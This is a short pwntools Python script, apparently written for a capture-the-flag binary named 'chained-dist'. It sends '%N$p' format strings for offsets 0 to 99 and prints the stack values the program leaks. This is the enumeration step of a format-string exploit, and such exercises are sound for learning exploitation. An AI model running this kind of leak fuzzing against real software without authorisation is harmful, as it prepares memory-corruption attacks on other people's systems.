from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./chained-dist', checksec=False)

# Let's fuzz x values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        p.recvline()
        p.recvline()
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendline('%{}$p'.format(i).encode())
        # Receive the response
        result = p.recvline().decode()
        # If the item from the stack isn't empty, print it
        if result:
            # Print the result find in *** ***
            print(str(i) + ":" + result.split("***")[1])
    except EOFError:
        pass
